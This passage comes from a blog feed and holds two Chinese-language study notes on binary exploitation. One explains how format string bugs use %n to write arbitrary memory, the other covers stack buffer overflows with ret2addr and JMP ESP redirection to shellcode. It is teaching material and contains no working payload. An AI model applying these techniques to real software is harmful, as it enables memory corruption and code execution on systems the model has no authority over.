alt=""></p><p><strong>如何写入地址，需要用到linux自带的printf命令，将shellcode编码转义为字符</strong>。（注意用反引号将printf命令括住，反引号在Tab键的上面，反引号内的内容会被当做命令执行。）<br><strong>如果是用scanf输入字符串，则无法使用printf命令，只能对照ascii码表，scanf和命令行输入的shellcode编码不能直接被转义。（所以为了方便演示，后面都使用了命令行输入参数）</strong><br>写入地址实例：<br><img src="/2019/02/11/基本格式化字符串漏洞原理/14.png" alt=""></p><p>0x41414141这个地址已经成功写入内存，下面只需用%s读取对应位置，就能读取以0x41414141为首地址的字符串。<br>如果用%n就能将0x41414141这个地址指向的值修改，就能造成任意内存的修改，可以将栈中返回地址修改为想要执行的shellcode的首地址等等。</p><h4 id="修改内存"><a href="#修改内存" class="headerlink" title="修改内存"></a>修改内存</h4><p>下面写个修改静态变量的例子<br>例：<br><img src="/2019/02/11/基本格式化字符串漏洞原理/15.png" alt=""></p><p>测试前，请先关闭内存地址随机化（PIE），否者b在内存中的地址是不确定的。<br>先运行下，得到b的地址<br><img src="/2019/02/11/基本格式化字符串漏洞原理/16.png" alt=""></p><p>接着确定偏移量<br><img src="/2019/02/11/基本格式化字符串漏洞原理/17.png" alt=""></p><p>这里是第九个参数。<br>接着用shellcode编码将b的地址写入，并查看能否写入成功。<br><img src="/2019/02/11/基本格式化字符串漏洞原理/18.png" alt=""><br>用%n修改其值。<br><img src="/2019/02/11/基本格式化字符串漏洞原理/19.png" alt=""><br>因为%n之前打印了75个字符，所以这里将b的值从0修改为75<br><strong>你也可以通过%&lt; number &gt;$n 来直接修改第九个参数来修改b的值</strong>。注意在命令行输入字符串参数时，要用 “ \ “将 $ 转义，例如：<br><img src="/2019/02/11/基本格式化字符串漏洞原理/20.png" alt=""></p><p>在%n之前打印了4个字符，所以b的值直接被修改为4了。<br>你可以通过控制打印的字符个数来修改b的值，达到几乎任意修改。<br>例如%0xxxxxd，通过打印数字前面补0，进行简化。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;理解这个漏洞的原理，你需要有汇编层面的函数调用和函数的参数传递知识。如果你不清楚函数的参数是如何传递的，可以看《加密与解密》的逆向分析技术篇。&lt;/p&gt;
&lt;p&gt;再说格式化字符串漏洞之前，先了解一下printf函数和利用该漏洞的重要 格式化字符串%n，利用他可以做到几乎任意内存
      
    
    </summary>
    
    
      <category term="pwnable" scheme="http://yoursite.com/tags/pwnable/"/>
    
      <category term="fmtstr" scheme="http://yoursite.com/tags/fmtstr/"/>
    
  </entry>
  
  <entry>
    <title>基本栈溢出</title>
    <link href="http://yoursite.com/2019/02/11/%E5%9F%BA%E6%9C%AC%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <id>http://yoursite.com/2019/02/11/基本栈溢出/</id>
    <published>2019-02-11T08:27:00.000Z</published>
    <updated>2019-02-26T12:15:05.978Z</updated>
    
    <content type="html"><![CDATA[<p>ret2addr和ret2arg这两种利用手法在《黑手缓冲区溢出教程》里有所提及。这两种只是基本的利用手法，如果开启了NX（堆栈代码不可执行）或者ASLR就无用武之地了，需要更高级的利用手法，例如ret2libc，ret2plt，和ROP等高级利用手法，这篇笔记就只说下基本的利用手法及漏洞原理。</p><p>了解栈溢出漏洞，需要对汇编里的call指令（相当于push eip和jmp 函数首地址 ），ret指令（相当于pop eip），函数的调用过程有所了解。《加密与解密》的逆向分析技术篇中函数部分说的很清楚。下面也会有所介绍。</p><h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a><strong>简介</strong></h5><p>栈溢出是向栈中写入超过原本长度限制的数据，使栈中的其他数据被覆盖，常见的是覆盖栈中返回地址，改变程序的执行流程。<br>栈溢出漏洞成立需要两个条件，其一是：有向栈中写入数据的行为，另一个是：使用了gets，strcpy，strcat等 不限制数据输入长度或者不检查数组长度的函数。</p><h4 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a><strong>预备知识</strong></h4><p>函数的调用和返回等过程都是在栈中完成的，栈中也保存着局部变量和函数的参数。<br>说之前先复习下函数调用的知识。<br>调用函数前，如果函数有参数，需要先将参数传入栈中（值传递本质是将变量复制一份压入堆栈，而地址传递，是将变量的地址直接压入栈中，通过加上中括号[]，直接访问）<br><strong>一般情况下参数的入栈是从右往左依次入栈的（cdecl调用约定，stdcall，fastcall等）。</strong><br>值传递模板（非fastcall调用约定，fastcall调用约定前两个参数会直接用寄存器，不用堆栈，后面的参数仍然用堆栈传参）如下：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">EBP</span>-xxx]  //<span class="keyword">push</span> 后无法直接接内存单元,需要先传给寄存器</span><br><span class="line"><span class="keyword">push</span> <span class="built_in">eax</span> //压入堆栈传参</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>，<span class="built_in">dword</span> <span class="built_in">ptr</span> [xxx]</span><br><span class="line"><span class="keyword">push</span> <span class="built_in">eax</span></span><br><span class="line">.....</span><br></pre></td></tr></table></figure><p>传完参数后会call 函数（call 会将调用函数即母函数的call指令的下一条要执行的指令的地址压入堆栈，然后再跳转到函数代码段的首地址，这和cpu执行指令的过程有关，cpu执行指令的过程如下：1。读取EIP指向的指令，将其放入指令缓冲器，2。EIP指向下一条指令，3。执行指令缓冲器里的指令，然后返回 1。）</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">call</span> 函数代码首地址</span><br></pre></td></tr></table></figure><p>函数内容有个模板（下面为debug版，release版会有所不同）如下：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span> <span class="built_in">ebp</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">esp</span></span><br><span class="line">//这里提升堆栈</span><br><span class="line"><span class="keyword">sub</span> <span class="built_in">esp</span>,<span class="number">0x40</span>  </span><br><span class="line">//这里是开辟缓冲区，不同编译器开辟的缓冲区大小不同（会根据你所用的变量的多少和大小来开辟）。</span><br><span class="line"><span class="keyword">push</span> <span class="built_in">edi</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">esi</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">ebx</span></span><br><span class="line">//保留现场</span><br><span class="line"><span class="keyword">lea</span> <span class="built_in">edi</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x40</span>]</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="number">0x10</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="number">0xcccccccc</span></span><br><span class="line"><span class="keyword">rep</span> stos dowrd <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>]</span><br><span class="line">//填充缓冲区（清除垃圾数据），用于存放局部变量</span><br><span class="line">----------------</span><br><span class="line">这里是写函数的功能</span><br><span class="line">----------------</span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">ebx</span></span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">esi</span></span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">edi</span></span><br><span class="line">    //恢复现场</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">esp</span>,<span class="built_in">ebp</span></span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">ebp</span></span><br><span class="line">    <span class="keyword">ret</span></span><br></pre></td></tr></table></figure><p>执行完call函数后的堆栈图如下（下面是高址，上面是低址）：<br><img src="/2019/02/11/基本栈溢出/1.png" alt=""></p><p>此时，EBP的位置就很关键了，使用EBP+xxx，可以访问到传入栈中的参数，向上EBP-xxx，可以访问局部变量。<br>当函数的代码执行到</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">esp</span>，<span class="built_in">ebp</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">ebp</span></span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure><p>此时ESP指向栈中的返回地址，执行ret执行（相当于pop eip）后就会将返回地址赋值给EIP，函数就执行完毕了，此时EIP重新指向母函数。</p><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a><strong>漏洞原理</strong></h5><p>漏洞的关键就是利用gets，strcpy，strcat 等函数，<strong>输入或者拼接超过字符数组原先规定的长度的字符串</strong>。<br>例如原先定义的字符数组 a[8]，你使用gets函数，输入了”AAAAAAAAAAAABBBB”,原先编译器编译成汇编时并没有预留足够的空间，例如前面函数模板中的 <code>sub esp，0x40</code>，他只开辟了0x40的空间，那么多输入的字符串就会将堆栈中的其他内容覆盖掉。<br>调用gets前的堆栈图如下：<br><img src="/2019/02/11/基本栈溢出/2.png" alt=""></p><p>调用gets，输入”AAAAAAAAAAAABBBB”后的堆栈图如下：<br><img src="/2019/02/11/基本栈溢出/3.png" alt=""></p><p>起始EBP值，和返回地址以及后面的堆栈空间都可以被输入的字符串所覆盖，这就是缓冲区溢出漏洞。</p><p><strong>基本利用之ret2addr</strong><br>ret2addr就是 return to address ，就是将堆栈里的返回地址覆盖为你所编写的shellcode的首地址上，ret2addr特指的是缓冲区里的shellcode。<br>利用缓冲区溢出后的堆栈图如下：<br><img src="/2019/02/11/基本栈溢出/4.png" alt=""></p><p>当ret后 ，EIP就会指向shellcode的首地址，这样就能执行你的shellcode了。如何找到shellcode的首地址，在下篇笔记再提及。</p><p><strong>基本利用之ret2arg</strong><br>与ret2addr不同的之处是 shellcode在返回地址的下面，而不是在栈帧里。同时返回地址被覆盖为JMP ESP这个指令的首地址。利用后的堆栈图如下：<br><img src="/2019/02/11/基本栈溢出/5.png" alt=""></p><p>原来的返回地址被覆盖为JMP ESP指令的首地址。<br>因为<strong>ret后 ，ESP加4</strong>，则此时ESP指向shellcode的首地址，而EIP指向了JMP ESP指令的首地址，执行JMP ESP后，EIP就指向了shellcode的首地址，这样就会执行你的shellcode了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ret2addr和ret2arg这两种利用手法在《黑手缓冲区溢出教程》里有所提及。这两种只是基本的利用手法，如果开启了NX（堆栈代码不可执行）或者ASLR就无用武之地了，需要更高级的利用手法，例如ret2libc，ret2plt，和ROP等高级利用手法，这篇笔记就只说下基本
      
    
    </summary>
    
    
      <category term="pwnable" scheme="http://yoursite.com/tags/pwnable/"/>
    
      <category term="StackOverflow" scheme="http://yoursite.com/tags/StackOverflow/"/>
    
  </entry>
  
</feed>
